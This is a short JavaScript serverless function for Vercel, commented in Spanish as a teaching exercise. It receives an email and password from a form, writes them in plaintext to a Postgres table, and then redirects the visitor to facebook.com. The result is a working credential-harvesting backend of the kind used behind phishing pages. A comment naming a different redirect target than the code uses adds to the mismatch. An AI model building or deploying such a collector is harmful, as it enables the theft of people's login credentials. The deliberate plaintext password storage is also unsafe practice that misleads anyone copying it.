// ==========================================================
//  Función serverless de Vercel  ->  /api/login
//  Recibe el formulario, guarda el registro en la base de
//  datos (Neon Postgres) y redirige a la página.
//
//  NOTA DIDÁCTICA: aquí la contraseña se guarda en TEXTO PLANO.
//  Esto es a propósito para la práctica, pero es justo lo que
//  NO se debe hacer en un sistema real. Lo correcto es
//  guardarlas hasheadas (bcrypt).
// ==========================================================

import { neon } from "@neondatabase/serverless";

// Vercel inyecta DATABASE_URL automáticamente al instalar Neon.
const sql = neon(process.env.DATABASE_URL);

export default async function handler(req, res) {
  const metodo = req.method; // "POST" o "GET"

  // Según el método, los datos llegan en un lugar distinto:
  const datos = metodo === "POST" ? req.body : req.query;

  const email = datos?.email || "";
  const password = datos?.password || "";

  // Guardar el registro en la base de datos (contraseña en texto plano).
  try {
    await sql`
      INSERT INTO registros (correo, password_hash)
      VALUES (${email}, ${password})
    `;
  } catch (error) {
    console.log("Error al guardar en la base de datos:", error);
  }

  // Ya que se guardó, redirigir a la página de la UPY.
  // 302 = redirección temporal.
  res.writeHead(302, { Location: "https://www.facebook.com/" });
  res.end();
}
